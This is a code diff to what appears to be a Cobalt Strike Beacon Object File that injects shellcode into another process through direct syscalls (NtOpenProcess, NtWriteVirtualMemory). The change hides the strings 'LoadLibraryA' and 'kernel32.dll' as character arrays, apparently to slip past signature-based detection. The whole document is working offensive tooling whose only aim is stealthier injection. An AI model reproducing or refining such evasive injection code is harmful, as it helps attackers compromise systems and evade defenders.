@@ -6,6 +6,7 @@
 #include <windows.h>
 #include "beacon.h"
 #include "Syscalls.h"
+#include "stdint.h"
 
 WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);
 
@@ -32,6 +33,9 @@ void go(char * argc, int len)
 	SIZE_T bytesWritten = 0;
 	HANDLE threadHandle;
 	NTSTATUS nts;
+	// Obfuscate strings
+	uint8_t loadlib[] = { 'L','o','a','d','L','i','b','r','a','r','y','A', 0x00 };
+	uint8_t krnl32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x00 };
 
 	// resolve syscall addresses
     	sys.NtOpenProcess = (NtOpenProcess_t)GetSyscallStub("NtOpenProcess");
@@ -59,7 +63,8 @@ void go(char * argc, int len)
 		goto clean;
 	}
 
-	void *_loadLibrary = KERNEL32$GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
+	//void *_loadLibrary = KERNEL32$GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
+	void *_loadLibrary = KERNEL32$GetProcAddress(LoadLibraryA((const char*)krnl32), (const char*)loadlib);
 
 
 	nts = syscall->NtWriteVirtualMemory(Process_Handle, Alloc, shellcode, shell_len, NULL);
